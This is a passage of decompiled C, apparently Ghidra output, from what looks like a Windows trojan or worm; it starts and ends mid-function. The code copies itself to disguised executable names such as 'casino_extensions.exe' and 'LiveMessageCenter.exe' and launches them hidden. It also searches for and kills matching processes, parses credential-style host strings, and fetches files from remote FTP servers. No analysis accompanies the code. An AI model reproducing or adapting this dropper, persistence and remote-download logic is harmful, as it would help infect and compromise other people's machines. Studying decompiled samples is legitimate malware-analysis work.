  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined *local_8;
  
  puStack_10 = (undefined *)0x414eee;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_14 = &LAB_00414f2c;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  puStack_10 = &stack0xfffffffc;
  do {
    cVar1 = FUN_00414dbc(local_8,param_2);
    uVar2 = extraout_ECX;
    uVar3 = extraout_EDX;
  } while (cVar1 == '\0');
  do {
    cVar1 = FUN_00414c34(local_8,uVar3,uVar2);
    uVar2 = extraout_ECX_00;
    uVar3 = extraout_EDX_00;
  } while (cVar1 == '\0');
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00414f33;
  puStack_14 = (undefined *)0x414f2b;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00414f38(int param_1,int *param_2)

{
  int iVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_44;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  puStack_28 = &stack0xfffffffc;
  local_8 = 0;
  local_c = 0;
  local_10 = 0;
  local_14 = 0;
  local_18 = 0;
  local_1c = 0;
  puStack_2c = &LAB_0041506c;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  FUN_00402a1c();
  FUN_0040405c(param_2);
  if (param_1 == 1) {
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_8);
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_c);
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_10);
    iVar1 = FUN_00402e68(0x1a);
    puStack_44 = (&PTR_DAT_004183e0)[iVar1];
    FUN_00402e68(0x1a);
    FUN_00402e68(0x1a);
    FUN_004043b8(param_2,8);
  }
  else if (param_1 == 2) {
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_14);
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_18);
    uVar2 = FUN_00402e68(10);
    FUN_0040725c(uVar2,&local_1c);
    puStack_44 = &DAT_00415090;
    FUN_004043b8(param_2,5);
  }
  *in_FS_OFFSET = puStack_44;
  FUN_00404080(&local_1c,6);
  return;
}



void FUN_004150a8(int param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  byte *local_10;
  uint *local_c;
  int local_8;
  
  local_c = (uint *)0x0;
  local_10 = (byte *)0x0;
  puStack_18 = (undefined *)0x4150bd;
  local_8 = param_1;
  FUN_004044e8(param_1);
  puStack_1c = &LAB_00415176;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  puStack_18 = &stack0xfffffffc;
  FUN_00404558(local_8,1,3,(int *)&local_10);
  FUN_00407084(local_10,(byte **)&local_c);
  FUN_00404444(local_c,(uint *)&DAT_0041518c);
  *in_FS_OFFSET = uStack_20;
  puStack_18 = &LAB_0041517d;
  puStack_1c = (undefined *)0x415175;
  FUN_00404080((int *)&local_10,3);
  return;
}



void FUN_00415190(int param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  byte *local_10;
  uint *local_c;
  int local_8;
  
  local_c = (uint *)0x0;
  local_10 = (byte *)0x0;
  puStack_18 = (undefined *)0x4151a5;
  local_8 = param_1;
  FUN_004044e8(param_1);
  puStack_1c = &LAB_00415228;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  puStack_18 = &stack0xfffffffc;
  FUN_00404558(local_8,1,6,(int *)&local_10);
  FUN_00407084(local_10,(byte **)&local_c);
  FUN_00404444(local_c,(uint *)s_winlog_00415240);
  *in_FS_OFFSET = uStack_20;
  puStack_18 = &LAB_0041522f;
  puStack_1c = (undefined *)0x415227;
  FUN_00404080((int *)&local_10,3);
  return;
}



void FUN_00415248(char param_1)

{
  bool bVar1;
  bool bVar2;
  char cVar3;
  undefined4 uVar4;
  DWORD DVar5;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_174;
  undefined *puStack_170;
  undefined *puStack_16c;
  undefined *local_164;
  WORD local_160 [6];
  undefined4 *local_154;
  char local_5;
  
  local_164 = (undefined *)0x0;
  puStack_16c = (undefined *)0x41526e;
  local_5 = param_1;
  FUN_00404970((int)local_160,(int)PTR_DAT_00406414);
  puStack_170 = &LAB_00415357;
  uStack_174 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_174;
  bVar1 = false;
  puStack_16c = &stack0xfffffffc;
  bVar2 = FUN_004079fc((undefined *)DAT_004198e0);
  if (bVar2) {
    if (local_5 != '\0') {
      FUN_00404344((int *)&local_164,DAT_004198e0,(undefined4 *)PTR_s_casino_extensions_exe_004183b4
                  );
      uVar4 = FUN_00407708(local_164);
      if ((char)uVar4 != '\0') {
        FUN_004040b0(&DAT_004198cc,(undefined4 *)PTR_s_casino_extensions_exe_004183b4);
        goto LAB_0041532d;
      }
    }
    DVar5 = FUN_004077a0(s_Syn_______exe_00415370,0x3f,local_160);
    if (DVar5 == 0) {
      do {
        cVar3 = FUN_004150a8((int)local_154);
        if (cVar3 != '\0') {
          bVar1 = true;
          FUN_004040b0(&DAT_004198cc,local_154);
        }
        iVar6 = FUN_004077f0(local_160);
      } while ((iVar6 == 0) && (!bVar1));
      FUN_00407814((int)local_160);
    }
  }
LAB_0041532d:
  *in_FS_OFFSET = uStack_174;
  puStack_16c = &LAB_0041535e;
  puStack_170 = (undefined *)0x415345;
  FUN_0040405c((int *)&local_164);
  puStack_170 = (undefined *)0x415356;
  FUN_00404a34((int)local_160,(int)PTR_DAT_00406414);
  return;
}



void FUN_00415380(char param_1)

{
  bool bVar1;
  bool bVar2;
  char cVar3;
  undefined4 uVar4;
  DWORD DVar5;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_174;
  undefined *puStack_170;
  undefined *puStack_16c;
  undefined *local_164;
  WORD local_160 [6];
  undefined4 *local_154;
  char local_5;
  
  local_164 = (undefined *)0x0;
  puStack_16c = (undefined *)0x4153a6;
  local_5 = param_1;
  FUN_00404970((int)local_160,(int)PTR_DAT_00406414);
  puStack_170 = &LAB_0041548b;
  uStack_174 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_174;
  bVar1 = false;
  puStack_16c = &stack0xfffffffc;
  bVar2 = FUN_004079fc((undefined *)DAT_004198e0);
  if (bVar2) {
    if (local_5 != '\0') {
      FUN_00404344((int *)&local_164,DAT_004198e0,(undefined4 *)PTR_s_LiveMessageCenter_exe_004183bc
                  );
      uVar4 = FUN_00407708(local_164);
      if ((char)uVar4 != '\0') {
        FUN_004040b0(&DAT_004198cc,(undefined4 *)PTR_s_LiveMessageCenter_exe_004183bc);
        goto LAB_00415461;
      }
    }
    DVar5 = FUN_004077a0(s_Winlog____exe_004154a4,0x3f,local_160);
    if (DVar5 == 0) {
      do {
        cVar3 = FUN_00415190((int)local_154);
        if (cVar3 != '\0') {
          bVar1 = true;
          FUN_004040b0(&DAT_004198cc,local_154);
        }
        iVar6 = FUN_004077f0(local_160);
      } while ((iVar6 == 0) && (!bVar1));
      FUN_00407814((int)local_160);
    }
  }
LAB_00415461:
  *in_FS_OFFSET = uStack_174;
  puStack_16c = &LAB_00415492;
  puStack_170 = (undefined *)0x415479;
  FUN_0040405c((int *)&local_164);
  puStack_170 = (undefined *)0x41548a;
  FUN_00404a34((int)local_160,(int)PTR_DAT_00406414);
  return;
}



void FUN_004154b4(void)

{
  uint *puVar1;
  char cVar2;
  int iVar3;
  uint *unaff_EBX;
  uint uVar4;
  uint **in_FS_OFFSET;
  undefined uVar5;
  undefined4 *local_2c;
  int local_28;
  uint *local_24;
  uint *local_20;
  uint *local_1c;
  uint *local_18;
  uint *local_14;
  uint *local_c;
  uint *local_8;
  
  local_14 = (uint *)&stack0xfffffffc;
  iVar3 = 5;
  do {
    local_8 = (uint *)0x0;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  uVar5 = 1;
  local_18 = (uint *)&LAB_004155ff;
  local_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = (uint *)&local_1c;
  local_20 = (uint *)0x4154df;
  FUN_00407084(DAT_004198ec,(byte **)&local_8);
  local_20 = local_8;
  local_24 = (uint *)0x4154f0;
  FUN_00407084(DAT_004198e4,(byte **)&local_c);
  puVar1 = local_20;
  local_20 = (uint *)0x4154f9;
  FUN_00404444(puVar1,local_c);
  if ((bool)uVar5) {
    uVar4 = 1;
  }
  else {
    local_20 = (uint *)0x415512;
    puVar1 = unaff_EBX;
    FUN_00407084(DAT_004198ec,(byte **)&stack0xfffffff0);
    local_20 = puVar1;
    local_24 = (uint *)0x415523;
    FUN_00407084(DAT_004198e0,(byte **)&local_14);
    puVar1 = local_20;
    local_20 = (uint *)0x41552c;
    FUN_00404444(puVar1,local_14);
    if ((bool)uVar5) {
      local_20 = (uint *)0x41553f;
      FUN_00407084(DAT_004198e8,(byte **)&local_18);
      local_20 = local_18;
      local_24 = (uint *)0x415550;
      FUN_00407084(PTR_s_casino_extensions_exe_004183b4,(byte **)&local_1c);
      puVar1 = local_20;
      local_20 = (uint *)0x415559;
      FUN_00404444(puVar1,local_1c);
      if ((bool)uVar5) {
        uVar4 = 2;
      }
      else {
        local_20 = (uint *)0x41556c;
        cVar2 = FUN_004150a8((int)DAT_004198e8);
        uVar5 = cVar2 == '\0';
        if ((bool)uVar5) {
          local_20 = (uint *)0x415584;
          FUN_00407084(DAT_004198e8,(byte **)&local_20);
          local_24 = (uint *)0x415595;
          FUN_00407084(PTR_s_LiveMessageCenter_exe_004183bc,(byte **)&local_24);
          puVar1 = local_20;
          local_20 = (uint *)0x41559e;
          FUN_00404444(puVar1,local_24);
          if ((bool)uVar5) {
            uVar4 = 3;
          }
          else {
            local_20 = (uint *)0x4155b1;
            cVar2 = FUN_00415190((int)DAT_004198e8);
            if (cVar2 == '\0') {
              uVar4 = 0;
            }
            else {
              uVar4 = 5;
            }
          }
        }
        else {
          uVar4 = 4;
        }
      }
    }
    else {
      uVar4 = 0;
    }
  }
  local_20 = (uint *)0x4155cc;
  FUN_0040725c(uVar4,(int *)&local_2c);
  local_20 = (uint *)0x4155dc;
  FUN_00404344(&local_28,(undefined4 *)s__Procedure_CheckWhichPartItIs___R_00415618,local_2c);
  local_20 = (uint *)0x4155e4;
  FUN_00417448();
  *in_FS_OFFSET = local_1c;
  local_14 = (uint *)&LAB_00415606;
  local_18 = (uint *)0x4155fe;
  FUN_00404080((int *)&local_2c,10);
  return;
}



void FUN_00415644(void)

{
  LPCSTR pCVar1;
  LPCSTR lpExistingFileName;
  undefined4 *in_FS_OFFSET;
  BOOL bFailIfExists;
  UINT uCmdShow;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined *local_8;
  
  puStack_c = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  puStack_10 = &LAB_004156c9;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  FUN_00404344((int *)&DAT_004198d0,DAT_004198e0,(undefined4 *)PTR_s_casino_extensions_exe_004183b4)
  ;
  bFailIfExists = 0;
  pCVar1 = FUN_004044f8(DAT_004198d0);
  FUN_004029bc(0,(int *)&local_8);
  lpExistingFileName = FUN_004044f8(local_8);
  CopyFileA(lpExistingFileName,pCVar1,bFailIfExists);
  FUN_00414edc(DAT_004198d0,1);
  uCmdShow = 0;
  pCVar1 = FUN_004044f8(DAT_004198d0);
  WinExec(pCVar1,uCmdShow);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_004156d0;
  puStack_10 = (undefined *)0x4156c8;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_004156d4(void)

{
  LPCSTR pCVar1;
  LPCSTR lpExistingFileName;
  undefined4 *in_FS_OFFSET;
  BOOL bFailIfExists;
  UINT uCmdShow;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined *local_c;
  undefined *local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  local_c = (undefined *)0x0;
  puStack_14 = &LAB_00415771;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  FUN_00404344((int *)&DAT_004198d4,DAT_004198e0,(undefined4 *)PTR_s_LiveMessageCenter_exe_004183bc)
  ;
  bFailIfExists = 0;
  pCVar1 = FUN_004044f8((undefined *)DAT_004198d4);
  FUN_004029bc(0,(int *)&local_8);
  lpExistingFileName = FUN_004044f8(local_8);
  CopyFileA(lpExistingFileName,pCVar1,bFailIfExists);
  FUN_00414edc((undefined *)DAT_004198d4,2);
  uCmdShow = 0;
  FUN_00404344((int *)&local_c,DAT_004198d4,(undefined4 *)s___part2_00415784);
  pCVar1 = FUN_004044f8(local_c);
  WinExec(pCVar1,uCmdShow);
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00415778;
  puStack_14 = (undefined *)0x415770;
  FUN_00404080((int *)&local_c,2);
  return;
}



void FUN_0041578c(int param_1,int *param_2,undefined4 param_3,int *param_4,int *param_5,int *param_6
                 ,int *param_7)

{
  char cVar1;
  int iVar2;
  undefined4 unaff_EBX;
  undefined *puVar3;
  uint **in_FS_OFFSET;
  undefined uVar4;
  undefined4 *local_50;
  undefined4 *local_4c;
  undefined4 *local_48;
  undefined4 *local_44;
  undefined4 *local_40;
  undefined4 *local_3c;
  uint *local_38;
  uint *local_34;
  uint *local_30;
  uint *local_2c;
  uint *local_28;
  uint *local_24;
  uint *local_20;
  uint *puVar5;
  int iVar6;
  int local_8;
  
  iVar2 = 9;
  do {
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  LOCK();
  UNLOCK();
  local_20 = (uint *)0x4157b3;
  local_8 = param_1;
  FUN_004044e8(param_1);
  local_24 = (uint *)&LAB_00415aa0;
  local_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = (uint *)&local_28;
  local_2c = (uint *)0x4157d1;
  local_20 = (uint *)&stack0xfffffffc;
  FUN_004040f4((int *)&local_2c,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x4157e1;
  FUN_004040f4((int *)&local_24,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x4157f1;
  FUN_004040f4((int *)&local_28,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x415801;
  FUN_004040f4((int *)&local_30,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x415811;
  FUN_004040f4((int *)&local_34,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x415821;
  FUN_004040f4((int *)&local_38,*(int *)PTR_DAT_00418678);
  local_2c = (uint *)0x415829;
  iVar2 = FUN_004042f8(local_8);
  uVar4 = iVar2 == 0;
  if (0 < iVar2) {
    iVar6 = 1;
    do {
      cVar1 = *(char *)(local_8 + -1 + iVar6);
      unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),cVar1);
      if (cVar1 == ':') {
        local_2c = (uint *)(iVar6 + 1);
        local_30 = (uint *)0x415870;
        iVar2 = FUN_004042f8(local_8);
        uVar4 = iVar2 - (int)local_2c == 0;
        if ((int)local_2c <= iVar2) {
          iVar2 = (iVar2 - (int)local_2c) + 1;
          puVar5 = local_2c;
          goto LAB_0041587f;
        }
        break;
      }
      local_2c = (uint *)0x415853;
      FUN_00404244((int *)&local_3c,unaff_EBX);
      local_2c = (uint *)0x41585e;
      FUN_00404300((int *)&local_24,local_3c);
      iVar6 = iVar6 + 1;
      iVar2 = iVar2 + -1;
      uVar4 = iVar2 == 0;
    } while (!(bool)uVar4);
  }
  goto LAB_004159cf;
  while( true ) {
    local_2c = (uint *)0x415898;
    FUN_00404244((int *)&local_40,unaff_EBX);
    local_2c = (uint *)0x4158a3;
    FUN_00404300((int *)&local_28,local_40);
    puVar5 = (uint *)((int)puVar5 + 1);
    iVar2 = iVar2 + -1;
    uVar4 = iVar2 == 0;
    if ((bool)uVar4) break;
LAB_0041587f:
    cVar1 = *(char *)(local_8 + -1 + (int)puVar5);
    unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),cVar1);
    if (cVar1 == '@') {
      local_2c = (uint *)((int)puVar5 + 1);
      local_30 = (uint *)0x4158b5;
      iVar2 = FUN_004042f8(local_8);
      uVar4 = iVar2 - (int)local_2c == 0;
      if ((int)local_2c <= iVar2) {
        iVar2 = (iVar2 - (int)local_2c) + 1;
        puVar5 = local_2c;
        goto LAB_004158c4;
      }
      break;
    }
  }
  goto LAB_004159cf;
  while( true ) {
    local_2c = (uint *)0x4158dd;
    FUN_00404244((int *)&local_44,unaff_EBX);
    local_2c = (uint *)0x4158e8;
    FUN_00404300((int *)&local_2c,local_44);
    puVar5 = (uint *)((int)puVar5 + 1);
    iVar2 = iVar2 + -1;
    uVar4 = iVar2 == 0;
    if ((bool)uVar4) break;
LAB_004158c4:
    cVar1 = *(char *)(local_8 + -1 + (int)puVar5);
    unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),cVar1);
    if (cVar1 == ':') {
      local_2c = (uint *)((int)puVar5 + 1);
      local_30 = (uint *)0x4158fa;
      iVar2 = FUN_004042f8(local_8);
      uVar4 = iVar2 - (int)local_2c == 0;
      if ((int)local_2c <= iVar2) {
        iVar2 = (iVar2 - (int)local_2c) + 1;
        local_20 = local_2c;
        goto LAB_00415909;
      }
      break;
    }
  }
  goto LAB_004159cf;
  while( true ) {
    local_2c = (uint *)0x415922;
    FUN_00404244((int *)&local_48,unaff_EBX);
    local_2c = (uint *)0x41592d;
    FUN_00404300((int *)&local_30,local_48);
    local_20 = (uint *)((int)local_20 + 1);
    iVar2 = iVar2 + -1;
    uVar4 = iVar2 == 0;
    if ((bool)uVar4) break;
LAB_00415909:
    cVar1 = *(char *)((int)local_20 + local_8 + -1);
    unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),cVar1);
    if (cVar1 == '@') {
      puVar3 = (undefined *)((int)local_20 + 1);
      local_2c = (uint *)0x41593b;
      iVar2 = FUN_004042f8(local_8);
      uVar4 = iVar2 - (int)puVar3 == 0;
      if ((int)puVar3 <= iVar2) {
        iVar2 = (iVar2 - (int)puVar3) + 1;
        goto LAB_00415946;
      }
      break;
    }
  }
  goto LAB_004159cf;
  while( true ) {
    local_2c = (uint *)0x41595c;
    FUN_00404244((int *)&local_4c,unaff_EBX);
    local_2c = (uint *)0x415967;
    FUN_00404300((int *)&local_34,local_4c);
    puVar3 = puVar3 + 1;
    iVar2 = iVar2 + -1;
    uVar4 = iVar2 == 0;
    if ((bool)uVar4) break;
LAB_00415946:
    unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),puVar3[local_8 + -1]);
    if (puVar3[local_8 + -1] == '@') {
      puVar3 = puVar3 + 1;
      local_2c = (uint *)0x415974;
      iVar2 = FUN_004042f8(local_8);
      uVar4 = iVar2 - (int)puVar3 == 0;
      if ((int)puVar3 <= iVar2) {
        iVar2 = (iVar2 - (int)puVar3) + 1;
        do {
          local_2c = (uint *)0x41598a;
          FUN_00404244((int *)&local_50,CONCAT31((int3)((uint)local_8 >> 8),puVar3[local_8 + -1]));
          local_2c = (uint *)0x415995;
          FUN_00404300((int *)&local_38,local_50);
          puVar3 = puVar3 + 1;
          iVar2 = iVar2 + -1;
          uVar4 = iVar2 == 0;
        } while (!(bool)uVar4);
      }
      break;
    }
  }
LAB_004159cf:
  local_2c = (uint *)0x4159df;
  FUN_00404444(local_24,*(uint **)PTR_DAT_00418678);
  if (!(bool)uVar4) {
    local_2c = (uint *)0x4159ec;
    FUN_004040b0(param_2,local_24);
  }
  local_2c = (uint *)0x4159fc;
  FUN_00404444(local_28,*(uint **)PTR_DAT_00418678);
  if (!(bool)uVar4) {
    local_2c = (uint *)0x415a09;
    FUN_004040b0((int *)0x0,local_28);
  }
  puVar5 = local_2c;
  local_2c = (uint *)0x415a19;
  FUN_00404444(puVar5,*(uint **)PTR_DAT_00418678);
  puVar5 = local_2c;
  if (!(bool)uVar4) {
    local_2c = (uint *)0x415a26;
    FUN_004040b0(param_7,puVar5);
  }
  local_2c = (uint *)0x415a36;
  FUN_00404444(local_30,*(uint **)PTR_DAT_00418678);
  if (!(bool)uVar4) {
    local_2c = (uint *)0x415a43;
    FUN_004040b0(param_6,local_30);
  }
  local_2c = (uint *)0x415a53;
  FUN_00404444(local_34,*(uint **)PTR_DAT_00418678);
  if (!(bool)uVar4) {
    local_2c = (uint *)0x415a60;
    FUN_004040b0(param_5,local_34);
  }
  local_2c = (uint *)0x415a70;
  FUN_00404444(local_38,*(uint **)PTR_DAT_00418678);
  if (!(bool)uVar4) {
    local_2c = (uint *)0x415a7d;
    FUN_004040b0(param_4,local_38);
  }
  *in_FS_OFFSET = local_28;
  local_20 = (uint *)&LAB_00415aa7;
  local_24 = (uint *)0x415a97;
  FUN_00404080((int *)&local_50,0xc);
  local_24 = (uint *)0x415a9f;
  FUN_0040405c(&local_8);
  return;
}



void FUN_00415ab0(byte *param_1)

{
  HANDLE hObject;
  int iVar1;
  HANDLE hProcess;
  undefined4 *in_FS_OFFSET;
  undefined uVar2;
  uint *puVar3;
  UINT uExitCode;
  undefined4 uStack_164;
  undefined *puStack_160;
  undefined *puStack_15c;
  uint *local_14c;
  byte *local_148;
  uint *local_144;
  uint *local_140;
  undefined *local_13c;
  byte *local_138;
  uint *local_134;
  undefined4 local_130;
  DWORD local_128;
  undefined4 local_10c [65];
  byte *local_8;
  
  local_144 = (uint *)0x0;
  local_14c = (uint *)0x0;
  local_148 = (byte *)0x0;
  local_134 = (uint *)0x0;
  local_140 = (uint *)0x0;
  local_138 = (byte *)0x0;
  local_13c = (undefined *)0x0;
  puStack_15c = (undefined *)0x415af3;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_160 = &LAB_00415c1e;
  uStack_164 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_164;
  puStack_15c = &stack0xfffffffc;
  hObject = (HANDLE)FUN_00413328();
  local_130 = 0x128;
  iVar1 = FUN_00413348();
  do {
    uVar2 = iVar1 == 0;
    if ((bool)uVar2) {
      CloseHandle(hObject);
      *in_FS_OFFSET = uStack_164;
      puStack_15c = &LAB_00415c25;
      puStack_160 = (undefined *)0x415c15;
      FUN_00404080((int *)&local_14c,7);
      puStack_160 = (undefined *)0x415c1d;
      FUN_0040405c((int *)&local_8);
      return;
    }
    FUN_004042cc((int *)&local_13c,local_10c,0x104);
    FUN_00407908(local_13c,(int *)&local_138);
    FUN_00407048(local_138,(byte **)&local_134);
    puVar3 = local_134;
    FUN_00407048(local_8,(byte **)&local_140);
    FUN_00404444(puVar3,local_140);
    if ((bool)uVar2) {
LAB_00415bca:
      uExitCode = 0;
      hProcess = OpenProcess(1,0,local_128);
      TerminateProcess(hProcess,uExitCode);
    }
    else {
      FUN_004042cc((int *)&local_148,local_10c,0x104);
      FUN_00407048(local_148,(byte **)&local_144);
      puVar3 = local_144;
      FUN_00407048(local_8,(byte **)&local_14c);
      FUN_00404444(puVar3,local_14c);
      if ((bool)uVar2) goto LAB_00415bca;
    }
    iVar1 = FUN_00413368();
  } while( true );
}



void FUN_00415c30(undefined *param_1,undefined *param_2,undefined *param_3,undefined4 param_4,
                 undefined *param_5,undefined *param_6)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  int *in_FS_OFFSET;
  int iStack_2c;
  undefined *puStack_28;
  undefined *puStack_24;
  undefined *local_1c;
  undefined *local_18;
  undefined local_11;
  undefined *local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_1c = (undefined *)0x0;
  local_18 = (undefined *)0x0;
  puStack_24 = (undefined *)0x415c50;
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_24 = (undefined *)0x415c58;
  FUN_004044e8((int)local_c);
  puStack_24 = (undefined *)0x415c60;
  FUN_004044e8((int)local_10);
  puStack_24 = (undefined *)0x415c68;
  FUN_004044e8((int)param_6);
  puStack_24 = (undefined *)0x415c70;
  FUN_004044e8((int)param_5);
  puStack_28 = &LAB_00415d62;
  iStack_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack_2c;
  local_11 = 0;
  puStack_24 = &stack0xfffffffc;
  InternetOpenA();
  FUN_004044f8(local_10);
  FUN_004044f8(local_c);
  FUN_004044f8(local_8);
  iVar1 = InternetConnectA();
  if (iVar1 != 0) {
    if (param_5[1] == ':') {
      FUN_004078b4(param_5,(int *)&local_18);
      uVar2 = FUN_00407718(local_18);
      if ((char)uVar2 == '\0') {
        FUN_004078b4(param_5,(int *)&local_1c);
        FUN_00407a14(local_1c);
      }
    }
    FUN_004044f8(param_5);
    FUN_004044f8(param_6);
    iVar3 = FtpGetFileA();
    local_11 = iVar3 != 0;
  }
  InternetCloseHandle();
  *in_FS_OFFSET = iVar1;
  FUN_00404080((int *)&local_1c,2);
  FUN_00404080((int *)&local_10,3);
  FUN_00404080((int *)&param_5,2);
  return;
}



void FUN_00415d7c(undefined *param_1)

{
  undefined uVar1;
  int iVar2;
  undefined extraout_CL;
  undefined4 extraout_ECX;
  undefined extraout_DL;
  undefined4 *in_FS_OFFSET;
  float10 in_ST0;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  int local_c;
  undefined *local_8;
  
  local_c = 0;
  puStack_14 = (undefined *)0x415d93;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_18 = &LAB_00415e09;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  puStack_14 = &stack0xfffffffc;
  FUN_004142f4(0x415e8c,0x415e20,&local_c);
  FUN_00404300(&local_c,DAT_004198f4);
  iVar2 = FUN_00414800(local_c,local_8,extraout_ECX);
  if (iVar2 != 0) {
    uVar1 = FUN_00408bec();
    FUN_00414930(uVar1,extraout_DL,extraout_CL,(double)in_ST0);
  }
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00415e10;
  puStack_18 = (undefined *)0x415e08;
  FUN_00404080(&local_c,2);
  return;
}



void FUN_00415ea8(undefined4 *param_1,int *param_2)

{
  char cVar1;
  int iVar2;
  undefined4 unaff_EBX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined4 *local_10;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_c = (undefined4 *)0x0;
  local_10 = (undefined4 *)0x0;
  puStack_20 = (undefined *)0x415ec1;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_24 = &LAB_00415f4b;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  puStack_20 = &stack0xfffffffc;
  FUN_0040405c((int *)&local_c);
  iVar2 = FUN_004042f8((int)local_8);
  if (0 < iVar2) {
    do {
      cVar1 = *(char *)((int)local_8 + iVar2 + -1);
      unaff_EBX = CONCAT31((int3)((uint)unaff_EBX >> 8),cVar1);
      if ((cVar1 == '\\') || (cVar1 == '/')) break;
      FUN_00404244((int *)&local_10,unaff_EBX);
      FUN_00404344((int *)&local_c,local_10,local_c);
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  if (local_c == (undefined4 *)0x0) {
    FUN_004040b0(param_2,local_8);
  }
  else {
    FUN_004040b0(param_2,local_c);
  }
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_00415f52;
  puStack_24 = (undefined *)0x415f4a;
  FUN_00404080((int *)&local_10,3);
  return;
}



void FUN_00415f5c(undefined *param_1,undefined *param_2,undefined *param_3,undefined4 param_4,
                 undefined *param_5,undefined *param_6)

{
  int iVar1;
  undefined4 uVar2;
  char **in_FS_OFFSET;
  char *pcStack_16c;
  undefined *puStack_168;
  undefined *puStack_164;
  undefined *local_15c;
  undefined *local_158 [81];
  undefined local_11;
  undefined *local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_15c = (undefined *)0x0;
  local_158[0] = (undefined *)0x0;
  puStack_164 = (undefined *)0x415f85;
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_164 = (undefined *)0x415f8d;
  FUN_004044e8((int)local_c);
  puStack_164 = (undefined *)0x415f95;
  FUN_004044e8((int)local_10);
  puStack_164 = (undefined *)0x415f9d;
  FUN_004044e8((int)param_6);
  puStack_164 = (undefined *)0x415fa5;
  FUN_004044e8((int)param_5);
  puStack_168 = &LAB_004160dc;
  pcStack_16c = *in_FS_OFFSET;
  *in_FS_OFFSET = (char *)&pcStack_16c;
  local_11 = 0;
  puStack_164 = &stack0xfffffffc;
  iVar1 = InternetOpenA();
  if (iVar1 != 0) {
    FUN_004044f8(local_10);
    FUN_004044f8(local_c);
    FUN_004044f8(local_8);
    iVar1 = InternetConnectA();
    if (iVar1 != 0) {
      FUN_004044f8(param_6);
      iVar1 = FtpFindFirstFileA();
      if (iVar1 != 0) {
        uVar2 = FUN_00407708(param_5);
        if ((char)uVar2 == '\0') {
          if (param_5[1] == ':') {
            FUN_004078b4(param_5,(int *)local_158);
            uVar2 = FUN_00407718(local_158[0]);
            if ((char)uVar2 == '\0') {
              FUN_004078b4(param_5,(int *)&local_15c);
              FUN_00407a14(local_15c);
            }
          }
          FUN_004044f8(param_5);
          FUN_004044f8(param_6);
          iVar1 = FtpGetFileA();
          local_11 = iVar1 != 0;
        }
      }
    }
    InternetCloseHandle();
  }
  *in_FS_OFFSET = s_UserPC_004160f0;
